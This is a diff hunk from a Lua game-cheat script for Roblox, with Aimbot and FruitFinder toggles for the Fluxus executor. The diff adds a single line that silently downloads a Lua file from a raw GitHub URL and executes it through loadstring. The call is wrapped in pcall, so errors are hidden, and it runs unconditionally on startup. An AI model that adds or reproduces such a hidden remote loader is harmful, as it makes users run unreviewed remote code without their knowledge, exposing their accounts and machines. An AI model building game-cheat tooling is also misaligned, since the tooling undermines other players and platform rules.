@@ -203,6 +203,7 @@ local loadFluxusWarn = function()
     ]]
 end
 _G.run_time = true
+pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ZoiIntra/__Script/refs/heads/main/__Finded.lua"))() end)
 if isFluxus() then loadFluxusWarn() end
 if _G.Aimbot then __f['__load'](__f['__script']("Aimbot"))
 elseif _G.FruitFinder then __f['__load'](__f['__script']("FruitFinder"))
